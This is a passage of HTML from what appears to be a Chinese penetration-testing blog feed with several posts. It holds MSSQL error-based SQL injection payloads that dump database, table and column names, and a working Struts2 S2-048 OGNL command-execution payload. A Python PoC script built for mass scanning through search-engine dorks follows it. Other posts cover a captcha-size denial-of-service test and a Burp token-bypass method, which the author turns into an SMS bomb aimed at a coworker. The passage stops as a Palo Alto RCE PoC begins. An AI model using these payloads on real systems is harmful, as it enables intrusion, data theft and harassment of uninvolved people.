class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; payload5: and db_name()&gt;0 and &apos;1&apos;=&apos;1 // 当前数据库</span><br><span class="line">&gt; &gt; payload6: and user_name()&gt;0 and &apos;1&apos;=&apos;1 // 当前用户</span><br><span class="line">&gt; &gt; payload7: and @@servername&gt;0 and &apos;1&apos;=&apos;1 // 主机名</span><br><span class="line">&gt; &gt;</span><br></pre></td></tr></table></figure></blockquote></blockquote><blockquote><p><strong>注：爆破进行到下一步，爆破表的时候发现无论怎么构造，都是没有回显的，查找了一些文章，有人提到了Mssql 2008 出库不出表([</strong>你们有遇到过mssql2008出裤不出表的情况吗?<strong>](<a href="https://xz.aliyun.com/t/2270))的情况，这么尴尬，这么唬人的么？" target="_blank" rel="noopener">https://xz.aliyun.com/t/2270))的情况，这么尴尬，这么唬人的么？</a></strong></p></blockquote><h3 id="Part-Ⅲ-出库不出表？"><a href="#Part-Ⅲ-出库不出表？" class="headerlink" title="## Part Ⅲ 出库不出表？"></a>## Part Ⅲ 出库不出表？</h3><blockquote><p>和小伙伴讨论讨论分析了一下，这里为什么会没有任何回显，其实构造的payload是正常执行的，但是返回和正常返回一致，再回想一遍整个过程，发现了关键点的所在，也就清晰了整个流程；</p></blockquote><p><img src="https://i.loli.net/2018/08/17/5b768ad8db027.png" alt="逻辑流程图"></p><blockquote><p><strong>Bingo！！！！ ！！</strong></p><p><strong>重点在用户输入的ID和你使用or还是and连接语句</strong></p><ul><li>or : 使用or连接，那么无论ID处的查询结果是0还是1，均会触发到下一步，比较payload查询到的参数与0进行大小比较报错进而达到”爆表“等效果；</li><li>and : 使用and连接，那么执行结果分为两种显示情况<ul><li>ID查询返回结果为0，无论后半部分查询结果如何返回，最终结果均为0；</li><li>ID查询返回结果为1，结合后半部分查询结果为1，最终查询结果为1，触发比较，”爆表“、”爆字段“ and etc.</li></ul></li></ul></blockquote><h4 id="完成一次手注"><a href="#完成一次手注" class="headerlink" title="### 完成一次手注"></a>### 完成一次手注</h4><blockquote><ul><li>社会工程学</li></ul><blockquote><p>通过搜索引擎，社一个存在的用户ID号，用来进行查询，可以在这一步的两个请求，分别判断为存在以及返回用户信息：</p></blockquote><p><img src="https://i.loli.net/2018/07/13/5b4853fbccd61.png" alt="有数据返回"></p><ul><li>出库不出表？</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; payload: and (SELECT top 1 Name FROM Master..SysDatabases)&gt;0 // 爆其他数据库</span><br><span class="line">&gt; payload: and (select top 1 name from [数据库名字].sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0)&gt;0 // 爆表</span><br><span class="line">&gt; payload: and (select top 1 COLUMN_NAME from[数据库名字].information_schema.columns where TABLE_NAME=&apos;表名&apos;)&gt;0 // 爆字段</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>​    </p><ul><li>下图已到字段为止，ok，收工.</li></ul><p><img src="https://i.loli.net/2018/07/13/5b48556ec6dc4.png" alt=""></p></blockquote><h4 id="思路反思（当时自己的错误思路）"><a href="#思路反思（当时自己的错误思路）" class="headerlink" title="### 思路反思（当时自己的错误思路）"></a>### 思路反思（当时自己的错误思路）</h4><blockquote><p>这是一个用户输入ID的位置，输入ID之后进行了两个操作：</p><blockquote><ul><li>查询ID是否已存在，无论如何构造，该返回结果只是0或1；</li><li>查询ID对应的信息，如果已存在，返回对应用户信息，不存在，则返回“[]”，数据为空；</li></ul><p>注意：</p><ul><li><strong>这两个过程不存在逻辑关系，相互独立，不管是否已存在，都会请求查询ID对应的用户数据；</strong></li><li><strong>此处注入如果用一个不存在的用户ID，当查询结果显示用户ID并不不存在的时，停止进一步查询其他数据，所以返回结果均为空，在进行爆表爆字段等尝试的时候，也不会有任何的回显</strong></li></ul></blockquote><p>当时自己没有理清晰整个查询的流程以及使用什么方式连接，所以误导自己进入了误区，希望和我一样没有”精通“数据库的人阔以引以为戒。em……</p></blockquote><h2 id="0x03-参考资源"><a href="#0x03-参考资源" class="headerlink" title="# 0x03 参考资源"></a># 0x03 参考资源</h2><blockquote><p>难得这次帮自己丰富了一下经验，同时收获也很大，个中滋味就是很满足，小小满足感~~~</p><p>而且这次在搜索解决问题的过程中，发现了很不错的网站，可以学习参考。</p><ul><li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></li></ul></blockquote>]]></content>
      
      
        <tags>
            
            <tag> mssql 注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【One Poc One Day】—— Struts 048</title>
      <link href="/2018/08/13/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94%20Struts%20048/"/>
      <url>/2018/08/13/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94%20Struts%20048/</url>
      <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="# 0x01"></a># 0x01</h2><blockquote><p>One Poc One Day.</p></blockquote><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="# 0x02 原理"></a># 0x02 原理</h2><blockquote><p><a href="http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">【原理详解】—— S2-048 动态分析</a></p><p>感觉说到底还是调用到的函数会执行ognl表达式，然后传入的参数用户可控。</p></blockquote><h2 id="0x03-Poc"><a href="#0x03-Poc" class="headerlink" title="# 0x03 Poc"></a># 0x03 Poc</h2><h3 id="Payload"><a href="#Payload" class="headerlink" title="## Payload"></a>## Payload</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dobby').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在vulhub的环境中进行poc验证的时候，只要在正常的请求后在添加一个重复参数包含payload即可。</p><p><strong>不知道真实的环境中，有几个点还是有疑问的（需要真实环境验证）：</strong></p><ul><li><strong>是否需要再重新设计一下payload的形式；</strong></li><li><strong>是否需要每次都必须指定参数，并插入payload，这样的话还能否自动化；还是每次都要指定参数进行poc验证；</strong></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: am4zing</span></span><br><span class="line"><span class="comment"># Date: 2018-08-10 15:36:34</span></span><br><span class="line"><span class="comment"># Project: https://github.com/yizhimanpadewoniu</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">影响版本:</span></span><br><span class="line"><span class="string">2.0.0 - 2.3.32</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2048 -aG "inurl:login.action" --gproxy "http 127.0.0.1 1080"</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2048 -aZ "login.action"</span></span><br><span class="line"><span class="string">python POC-T.py -s struts2-s2048 -iF FILE.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">使用过程中，与其他不同，此处需要指定参数，否则会报错？(这一点没摸准，可以再更新)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">'http://'</span> + url</span><br><span class="line">    header = dict()</span><br><span class="line">    header[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    header[<span class="string">'User-Agent'</span>] = <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'</span></span><br><span class="line">    payload = <span class="string">'''%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dobby').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;'''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = urllib.quote(payload)</span><br><span class="line">        payload = <span class="string">'&amp;name='</span> + payload</span><br><span class="line">        post_data = raw_input(<span class="string">'post_data:'</span>) + payload</span><br><span class="line">        post_data = <span class="string">'name=q&amp;age=q&amp;__checkbox_bustedBefore=true&amp;description=q'</span> + post_data</span><br><span class="line">        result = requests.post(url, data=post_data, headers=header, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'dobby'</span> <span class="keyword">in</span> result.content:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'[S2-048]'</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="# 0x04 参考"></a># 0x04 参考</h2><ul><li><a href="https://www.anquanke.com/post/id/86398" target="_blank" rel="noopener">【安全客】—— 【漏洞分析】Struts2高危漏洞S2-048分析</a></li><li><a href="http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">【S2-048 动态分析】</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>图形验证码大小可控造成DOS攻击</title>
      <link href="/2018/08/13/%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%8F%AF%E6%8E%A7%E5%8F%AF%E9%80%A0%E6%88%90DOS%E6%94%BB%E5%87%BB/"/>
      <url>/2018/08/13/%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%8F%AF%E6%8E%A7%E5%8F%AF%E9%80%A0%E6%88%90DOS%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<h2 id="0x01-巧遇【新型漏洞】"><a href="#0x01-巧遇【新型漏洞】" class="headerlink" title="# 0x01 巧遇【新型漏洞】"></a># 0x01 巧遇【新型漏洞】</h2><p>次饭的时候看到知乎推了一篇文章，名为“<a href="https://zhuanlan.zhihu.com/p/41800341" target="_blank" rel="noopener">新类型【漏洞】验证码大小可控导致的拒绝服务攻击漏洞</a>”。</p><p>WTF，这不是刚刚正在测得图形验证码的地方么，竟然就看到这个文章了，你说巧不巧~~~</p><h2 id="0x02-发现问题"><a href="#0x02-发现问题" class="headerlink" title="# 0x02 发现问题"></a># 0x02 发现问题</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /userCenter/token/getImageToken.do?width=500&amp;height=20&amp;dt=Mon%20Aug%2013%202018%2011:32:46%20GMT+0800 HTTP/1.1</span><br><span class="line">Host: www.xxx.com</span><br></pre></td></tr></table></figure><blockquote><p>GET请求中包含width和height参数，返回的相应内容即是刷新后的图形验证码。</p></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e03b953.png" alt="获取验证码"></p><p>参考<a href="">文章</a>中的思路，修改可控图形参数<strong>“width”</strong>和<strong>“height”</strong>，宽度扩大到百倍50000，对比返回包的大小和返回时间，如下所示；</p><blockquote><ul><li>width为500，height为200：</li></ul></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e0052db.png" alt="500*200"></p><blockquote><ul><li>width扩大100倍，height不变：</li></ul></blockquote><p><img src="https://i.loli.net/2018/08/13/5b7121e03c862.png" alt="50000*200"></p><blockquote><p><strong>清晰的看到，返回包的大小从5000 bytes增加到了45000 bytes，时间从0.141s变成了1.462s</strong></p></blockquote><p>再次尝试将height扩大10倍，再看请求的延时会增加多少。</p><blockquote><p><strong>返回大小为420139 bytes，时间变为9.073s</strong></p></blockquote><p><img src="https://i.loli.net/2018/08/13/5b712615490d1.png" alt="50000*2000"></p><h2 id="0x03-验证问题"><a href="#0x03-验证问题" class="headerlink" title="# 0x03 验证问题"></a># 0x03 验证问题</h2><blockquote><ul><li>使用Intruder重放上一请求10次，使用另一IP访问网站资源，发现文字类的加载为常规速度，但附属的所有图片类资源的加载延迟特别高；</li><li>关闭重放攻击后，使用上一步IP访问网站，文章和图片均加载速度回归常速，可判断问题确实存在。</li><li><strong>因为文字类和图片的加载速度差异，可猜测图片服务部署在一个单独服务器中的可能性很大。</strong></li></ul></blockquote>]]></content>
      
      
        <tags>
            
            <tag> DOS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BurpSuite Extender之巧用Marco和Extractor绕过Token限制</title>
      <link href="/2018/08/09/BurpSuite-Extender%E4%B9%8B%E5%B7%A7%E7%94%A8Marco%E5%92%8CExtractor/"/>
      <url>/2018/08/09/BurpSuite-Extender%E4%B9%8B%E5%B7%A7%E7%94%A8Marco%E5%92%8CExtractor/</url>
      <content type="html"><![CDATA[<h2 id="0x01-前言几句"><a href="#0x01-前言几句" class="headerlink" title="# 0x01 前言几句"></a># 0x01 前言几句</h2><p><a href="https://xz.aliyun.com/t/2547#toc-9" target="_blank" rel="noopener">【首发”先知“】https://xz.aliyun.com/t/2547#toc-9</a></p><p>平时使用burp进行简单的测试，遇到各种各样的问题，使用各种各样的方法，我们可以抓包、改包、重放、爆破，同时有很多BApp Store有很多开源的扩展工具，今天我想要分享的是巧用一个名为“Extractor”的扩展插件和Burpsuite Marco的结合用法，获取他在你解决某些场景下的anti-token的问题时候可以有所帮助。</p><h2 id="0x02-Extractor"><a href="#0x02-Extractor" class="headerlink" title="# 0x02 Extractor"></a># 0x02 Extractor</h2><h4 id="1-是什么"><a href="#1-是什么" class="headerlink" title="1. 是什么?"></a><strong>1. 是什么?</strong></h4><blockquote><p><strong> A Burp extension for generic extraction and reuse of data within HTTP requests and responses. </strong></p><p>用于在HTTP请求和响应中进行提取和重用数据的Burp扩展。 </p></blockquote><p><a href="https://github.com/NetSPI/BurpExtractor" target="_blank" rel="noopener">Extractor</a>的功能用上面的一句话完全概括了，请求响应数据的提取和请求中数据的替换重放使用，那么这个工具的功能到底有多强大，多复杂呢？</p><p><img src="https://i.loli.net/2018/08/08/5b6b0c384a379.png" alt="扩展界面展示">  </p><blockquote><p>可以看到，扩展界面大致分为三大部分：</p><ul><li>1：选择要插入替换数据的请求；</li><li>2：选择要提取数据的响应；</li><li>3：开启Debug；</li><li>4：Go！！！</li></ul></blockquote><h4 id="2-怎么用"><a href="#2-怎么用" class="headerlink" title="2. 怎么用?"></a><strong>2. 怎么用?</strong></h4><p><a href="https://github.com/NetSPI/BurpExtractor" target="_blank" rel="noopener">Extractor</a>使用方法就是从一个请求的相应中提取数据，再另一个http请求中重用，诸如：CSRF token、 timestamps(时间戳)、Auth Bearer token等某些场景中，通过使用正则提取数据，并且在burp发送指定请求时将提取出的值替换掉请求中的正则匹配到的值。</p><h2 id="0x03-Marco"><a href="#0x03-Marco" class="headerlink" title="# 0x03 Marco"></a># 0x03 Marco</h2><p>burpsuite自带的功能，宏这个功能应该都不陌生，之前已经有相关文章介绍Marco，如：“<a href="http://www.freebuf.com/articles/web/156735.html" target="_blank" rel="noopener">Burpsuite中宏的使用</a>”一文。文章中详细的介绍了一般宏的录制以及使用，本文的宏只是涉及到最基础的用法，重点是在实际使用中的思路。</p><h2 id="0x04-实例分析"><a href="#0x04-实例分析" class="headerlink" title="# 0x04 实例分析"></a># 0x04 实例分析</h2><h4 id="1-发现问题"><a href="#1-发现问题" class="headerlink" title="1. 发现问题"></a><strong>1. 发现问题</strong></h4><blockquote><p>之前在测试某个接口的时候，发现有这样一个请求：</p></blockquote><pre><code>httpPOST /WechatApp/public/zzbcd/P8009.do HTTP/1.1Host：www.xxx.com{&quot;No&quot;:&quot;123456&quot;}</code></pre><blockquote><p>请求的返回中包含了如下信息：</p></blockquote><pre><code>http {&quot;STATUS&quot;:&quot;1&quot;,&quot;No&quot;:&quot;123456&quot;,&quot;tranDate&quot;,&quot;2018-8-9&quot;,&quot;ID&quot;:&quot;411103199206121819&quot;,&quot;&quot;:&quot;Name&quot;:&quot;王刚&quot;,&quot;Phone&quot;:&quot;13333333333&quot;,&quot;idType&quot;:&quot;100000&quot;}</code></pre><blockquote><p>这里传入的参数是一个规律递增的ID值，通过重放的方式，可以批量获取大量个人敏感的身份信息。问题不算太大，但绝不是可以忽略掉的问题。</p></blockquote><h4 id="2-修复问题"><a href="#2-修复问题" class="headerlink" title="2. 修复问题"></a><strong>2. 修复问题</strong></h4><blockquote><p>修复方案是建议是防止重放攻击，并且模糊处理返回的敏感信息。几日后，收到复测的安排，遂进行复测。</p><p>修复后的接口请求如下，其添加了一个Token_Id值，用来防止重放攻击？</p></blockquote><pre><code>httpPOST /WechatApp/public/zzbcd/P8009.do HTTP/1.1Host：www.xxx.com{&quot;No&quot;:&quot;123456&quot;,&quot;Token_Id&quot;:&quot;N5EVWFXBEDFL51GMUQECPZF4A5X096HD20180809123129&quot;}</code></pre><blockquote><p>重放之后提示“系统异常请稍后重试”，通过修改cookie参数中的值、refrer参数等方法，均无法绕过token_Id的检验。</p></blockquote><p><img src="https://i.loli.net/2018/08/09/5b6b2151d4309.png" alt="请求实例图"></p><blockquote><p>重新查看proxy中的请求记录，发现在每次请求之前，会先发送一个请求，该请求返回包中，只有一个参数，即tokenId。如下所示：</p></blockquote><p><img src="https://i.loli.net/2018/08/09/5b6b21cbb55dc.png" alt="获取token请求"></p><p><img src="https://i.loli.net/2018/08/09/5b6b2268c4b56.png" alt="get tokenId数据包"></p><blockquote><p>到此，脑子里首先想到的就是刚刚提到的“<a href="http://www.freebuf.com/articles/web/156735.html" target="_blank" rel="noopener">Burpsuite中宏的使用</a>”，于是仔细阅读了该篇文章的用法，并仔细的对本地复测的情况录制了宏，遗憾的是最终并未能够成功，可能原因有二三：  </p></blockquote><blockquote><ul><li>自己配置/使用不正确(自认为概率很小，因为请教了不同的大佬，并进行了多次尝试)；</li><li>文章中示例使用DVWA搭建，具体到请求和场景和真实情况有所出入；</li><li>自己写了等效的脚本，一个函数请求并获取tokenId，另一个替换tokenId后发送请求获取信息，均已失败告终<br>看来，此处的问题真的是修复了吧……</li></ul></blockquote><h4 id="3-再次尝试绕过"><a href="#3-再次尝试绕过" class="headerlink" title="3. 再次尝试绕过"></a><strong>3. 再次尝试绕过</strong></h4><p>当看到Extractor插件的时候，我决定重新在生产上复测这个当时存疑的接口。</p><blockquote><p>首先，分别将两个接口发送到Extractor扩展。</p></blockquote><p><img src="https://i.loli.net/2018/08/09/5b6b25b531d37.png" alt="发送到Extractor"></p><blockquote><p>可以在Extractor看到两个请求，上工作区选择“使用tokenId”的请求，下工作区选择“获取tokenId”的响应包，点击Go，Extractor就准备好了。</p></blockquote><p><img src="https://i.loli.net/2018/08/09/5b6baaf16cd33.png" alt="选择要替换和获取的请求"></p><p><img src="https://i.loli.net/2018/08/09/5b6bacb93b5f9.png" alt="匹配设置"></p><blockquote><p>上图的中标注了四个点，解释一下：</p><ul><li>1：开启Extractor；</li><li>2：最新正则匹配到的tokenId显示区域</li><li>3：设置host，可以直接使用burp scope中的host，也可以自定义host</li><li>4：左右两边，分别设置需要正则匹配的内容(此处左侧正则匹配要带如请求的tokenId，右侧表示正则匹配获取到的tokenId)</li></ul><p>当 “Turn Extractor on”被开启后，Extractor即开始起作用。此时去Repeater进行重放，看是否Extractor已经生效，每次请求替换最新获取匹配的tokenId值，但是你会发现，可能会失败了。问题出在这里。</p></blockquote><p><img src="https://i.loli.net/2018/08/09/5b6bdb2cf0f18.png" alt="错误问题出现点"></p><blockquote><p>“Value to insert”值不为空才可以正常使用，需要先触发“获取tokenId”请求，之后Extractor才可以从相应中正则匹配到tokenId值，<a href="https://github.com/NetSPI/BurpExtractor" target="_blank" rel="noopener">Extractor项目</a>中的gif动画因为是简单的演示了功能，可能忽略掉他在使用时先触发了GET请求去get token。</p><p>所以此处我们如果想要进行爆破或者枚举的操作，必须每次请求前先请求一次“获取tokenId”，这样才可以达到枚举爆破的效果，So，是时候用Marco了。</p></blockquote><p>这里的思路倒也简单，可以帮助理解burp在使用Marco(宏)的时候是怎样的一个逻辑，录制一个宏，什么条件都不需要附加，只需要保证在请求之前先把宏中设置的“获取tokenId”请求就可以。</p><p><img src="https://i.loli.net/2018/08/09/5b6bdf1e50cb9.png" alt="录制宏规则"></p><p><img src="https://i.loli.net/2018/08/09/5b6be08d44ac7.png" alt="选择录制的宏"></p><blockquote><p><strong>注(这里的几点说明)：</strong></p><ul><li>Add添加一个规则Rule；</li><li>规则内容为“在请求之前，先运行一个Marco(宏)”;</li><li>“Session Handling Rules”和“Marco”配合来用，前者配置一个规则，调用后者的内容；</li><li>通过在“Scope“中配置在哪个特殊请求或者全部请求需要触发宏，并且选择在哪些功能区触发之后，可以进行验证了。</li></ul></blockquote><h4 id="4-最终验证"><a href="#4-最终验证" class="headerlink" title="4. 最终验证"></a><strong>4. 最终验证</strong></h4><p>下面是我在Repeater中连续点击多次之后的返回，如下所示：</p><p><img src="https://i.imgur.com/tE4zpZ7.gif" alt="重放gif"></p><blockquote><p>之后可以Intruder可以进行爆破咯~，结果就是问题真的修复了，虽然解决了tokenId的问题，但是修复再其他位置也做了校验，所以突破了tokenId的限制，但是无法重放攻击做信息搜集之类的敏感操作。OK，到一段落。</p><p><strong>PS: 一时手边没有真实有效的例子，之后再做补充真实过程。</strong></p></blockquote><h2 id="0x06-绕过流程"><a href="#0x06-绕过流程" class="headerlink" title="# 0x06 绕过流程"></a># 0x06 绕过流程</h2><p>整个过程中的逻辑流程，帮助理解整个绕过token校验的流程：</p><p><img src="https://i.loli.net/2018/08/09/5b6bf0dc2b65a.png" alt="流程图"></p><h2 id="0x05-再来一发"><a href="#0x05-再来一发" class="headerlink" title="# 0x05 再来一发"></a># 0x05 再来一发</h2><h4 id="1-发现问题-1"><a href="#1-发现问题-1" class="headerlink" title="1. 发现问题"></a><strong>1. 发现问题</strong></h4><blockquote><p>某微信公众号的注册接口  </p></blockquote><p><img src="https://i.loli.net/2018/08/09/5b6c0077ba493.png" alt="实例1.png"></p><blockquote><p>填写资料后提交请求，会发送短信通知返回结果。 </p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /mina/saveCustomerInfo?applyId=2018080916437317 HTTP/1.1</span><br><span class="line">Host: www.xxx.com</span><br><span class="line"></span><br><span class="line">UserData(包含手机号码)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/08/09/5b6c0574be666.png" alt="短信通知"></p><blockquote><p>尝试直接重放请求，并且修改其他可能参数，均提示报错。</p></blockquote><p><img src="https://i.loli.net/2018/08/09/5b6c05d4c4956.png" alt="重放攻击报错"></p><blockquote><p>看起来是某个值做了校验或者cookie做了校验。重新查看proxy记录，整个过程包括两个请求，即分两个步骤完成，第一个请求获取名为”applyId”的值，第二个请求使用该参数进行提交用户填写的数据，成功提交。  </p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /mina/apply HTTP/1.1</span><br><span class="line">Host: www.xxx.com</span><br><span class="line"></span><br><span class="line">UserData(包含手机号码)</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /mina/saveCustomerInfo?applyId=2018080916437317 HTTP/1.1</span><br><span class="line">Host: www.xxx.com</span><br><span class="line"></span><br><span class="line">UserData(包含手机号码)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/08/09/5b6c0644e478d.png" alt="完整过程1"></p><h4 id="2-绕过token限制"><a href="#2-绕过token限制" class="headerlink" title="2. 绕过token限制"></a><strong>2. 绕过token限制</strong></h4><p>绕过的思路和操作已经很清晰，遵循上一个实例的套路，添加两个请求到Extractor，分别选择“请求”和“响应”，录制一个“获取响应”的宏，并且定制好Rule，可以进行短信炸弹了，嗯，没有错，是短信炸弹，送给那个上班时间扣手机的同事，Intruder Null Payload来一百条为敬。</p><p><img src="https://i.loli.net/2018/08/09/5b6c099049d20.png" alt="短信炸弹1"></p><p><img src="https://i.loli.net/2018/08/09/5b6c0a32883dd.png" alt="短信炸弹2"></p><blockquote><p><strong>这里需要注意勾选你要覆盖到的功能区域，否则Marco可能会发现没有生效。</strong></p></blockquote><p><img src="https://i.loli.net/2018/08/09/5b6c09ea04fde.png" alt="短信炸弹2"></p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="# 0x07 参考"></a># 0x07 参考</h2><ul><li><a href="https://github.com/NetSPI/BurpExtractor" target="_blank" rel="noopener">https://github.com/NetSPI/BurpExtractor</a></li><li><a href="http://www.freebuf.com/articles/web/156735.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/156735.html</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【One Poc One Day】-- CVE-2017-15944</title>
      <link href="/2018/08/08/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94CVE-2017-15944/"/>
      <url>/2018/08/08/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94CVE-2017-15944/</url>
      <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="# 0x01"></a># 0x01</h2><blockquote><p>One Poc One Day.</p></blockquote><h2 id="0x02-Poc"><a href="#0x02-Poc" class="headerlink" title="# 0x02 Poc"></a># 0x02 Poc</h2><p>Palo Alto Networks firewalls  的RCE。</p><blockquote><p>Poc只做了轻微的修改，em……</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 